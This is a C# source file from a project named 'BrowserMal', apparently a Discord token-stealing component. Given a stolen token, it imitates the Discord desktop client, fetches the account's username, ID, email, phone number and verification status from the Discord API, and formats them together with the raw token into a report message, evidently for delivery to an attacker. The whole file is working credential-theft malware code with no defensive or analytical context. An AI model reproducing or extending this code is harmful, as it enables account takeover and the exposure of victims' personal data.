using BrowserMal.Discord.Model;
using Newtonsoft.Json;
using System.Net;
using System.Text;

namespace BrowserMal.Discord
{
    public class DiscordUserManager
    {
        public static DiscordUser GetUserInformation(string token)
        {
            using (WebClient wc = new WebClient())
            {
                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9007 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36");
                wc.Headers.Add("Accept", "*/*");
                wc.Headers.Add("Authorization", token);

                string json = wc.DownloadString("https://discordapp.com/api/v9/users/@me");
                return JsonConvert.DeserializeObject<DiscordUser>(json);
            }
        }

        public static string GenerateUserInformationMessage(DiscordUser discordUser, string discordToken)
        {
            StringBuilder sb = new StringBuilder();

            sb.AppendLine($"Username: ``{discordUser.username}#{discordUser.discriminator}``");
            sb.AppendLine($"Id: ``{discordUser.id}``");
            sb.AppendLine($"Email: ``{discordUser.email}``");
            sb.AppendLine($"Phone: ``{discordUser.phone}``");
            sb.AppendLine($"Verified: ``{discordUser.verified}``");
            sb.AppendLine($"Token: ``{discordToken}``");

            return sb.ToString();
        }
    }
}
